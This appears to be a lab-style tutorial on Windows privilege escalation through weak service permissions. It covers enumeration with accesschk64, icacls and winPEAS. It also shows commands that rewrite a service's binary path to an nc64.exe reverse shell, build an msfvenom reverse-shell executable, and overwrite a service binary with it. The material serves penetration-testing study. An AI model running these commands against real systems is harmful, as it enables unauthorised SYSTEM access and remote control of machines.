
---
### **1. Weak Permission on Service Configuration**

You can use the `sc.exe` command to view and manipulate the configuration of a Windows service.

- **Query the service configuration**:
    
    ```powershell
    sc.exe qc SimpleService
    ```
    
- The command outputs the **binary path** for the service and other configurations.
    
    Example output:
    
    ```powershell
    BINARY_PATH_NAME: C:\Users\Quickemu\Downloads\simpleService.exe
    ```
    
- **Check service permissions with `accesschk64`**:
    
    Use the `accesschk64' program to check if we have privileges over that` process.
    https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
    
    You can check who has access to the service and its configuration:
    
    ```powershell
    .\accesschk64.exe /accepteula -uwcqv SimpleService
    ```
    
    Example output:
    
    ```powershell
    SimpleService
    RW NT AUTHORITY\SYSTEM
    RW BUILTIN\Administrators
    ```
    
- **Modifying the service binary path**:
    
    You can exploit weak permissions by changing the **binary path** of the service to a malicious executable.
    
    Example:
    
    ```powershell
    sc.exe config SimpleService binpath="C:\Users\Quickemu\Downloads\nc64.exe 192.168.122.1 4321 -e C:\Windows\system32\cmd.exe"
    ```
    
    **Attack Steps**:
    
    1. **Create a reverse shell executable** using `msfvenom`:
        
        ```bash
        msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f exe -o malicious.exe
        ```
        
    2. **Change the service binary path** to the malicious executable:
        
        ```powershell
        sc.exe config SimpleService binpath="C:\Users\Quickemu\Downloads\malicious.exe"
        ```
        
    3. **Restart the service** to execute the reverse shell:
        
        ```powershell
        sc.exe stop SimpleService
        sc.exe start SimpleService
        ```
        

---

### **2. Weak Permission on Service Binary**

In some cases, the service binary itself may have weak permissions that allow modification by unauthorized users. You can use `icacls.exe` to check the permissions of the service binary.

- First, we get the binary paths of the various processes
  PS C:\Users\Quickemu> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
  
  **Check the binary permissions**:
    
    ```powershell
    icacls.exe .\simpleService.exe
    ```
    
    Example output:
    
    ```powershell
    .\simpleService.exe NT AUTHORITY\SYSTEM:(F)
                        BUILTIN\Administrators:(F)
                        QUICKEM-5QLQQP9\Quickemu:(F)
    ```
    
    If the user `Quickemu` has **full access**, it means you can overwrite the binary with a malicious executable.
    
- **Overwrite the service binary**:
    
    1. **Backup the original binary**:
        
        ```powershell
        cp .\simpleService.exe .\simpleService.exe.bkp
        ```
        
    2. **Replace the binary with a malicious one**:
        
        ```powershell
        cp .\malicious.exe .\simpleService.exe
        ```
        
    3. **Restart the service** to execute the malicious binary:
        
        ```powershell
        sc.exe stop SimpleService
        sc.exe start SimpleService
        ```
        

---

### **3. Service Enumeration with winPEAS**

`winPEAS` is a tool for enumerating potential privilege escalation vectors, including weak service permissions.

- **Download `winPEAS`**:
    
    ```bash
    wget https://github.com/peass-ng/PEASS-ng/releases/download/20241011-2e37ba11/winPEASx64.exe
    
'In powershell (Windows)'

    Invoke-WebRequest -Uri "https://github.com/peass-ng/PEASS-ng/releases/download/20241011-2e37ba11/winPEASx64.exe" -OutFile ".\winPEASx64.exe"
    ```
    
- **Enumerate service-related information**:
    
    ```powershell
    .\winPEAS.exe quiet servicesinfo
    ```
    

This will help you quickly identify services with weak configurations or permissions that may be exploited for privilege escalation.

---

### **4. References**

- **Windows Privilege Escalation Awesome Scripts**: [PEASS-ng GitHub](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
    
- **Weak Service Permissions**: [Ired Team's guide](https://www.ired.team/offensive-security/privilege-escalation/weak-service-permissions)
    
- **Windows Local Privilege Escalation**: [Xorond](https://xorond.com/posts/2021/04/windows-local-privilege-escalation/)
    
- **Service Misconfiguration**: [NaryCyber's blog](https://www.narycyber.com/posts/privilege-escalation/windows/service-misconfigurations/)
    
- **Weak Service Permissions – Windows Privilege Escalation**: [Juggernaut-Sec](https://juggernaut-sec.com/weak-service-permissions-windows-privilege-escalation/)
    
- **PrivEsc: Insecure Service Permissions**: [AkimboCore](https://akimbocore.com/article/privilege-escalation-insecure-service-permissions/)
    

---

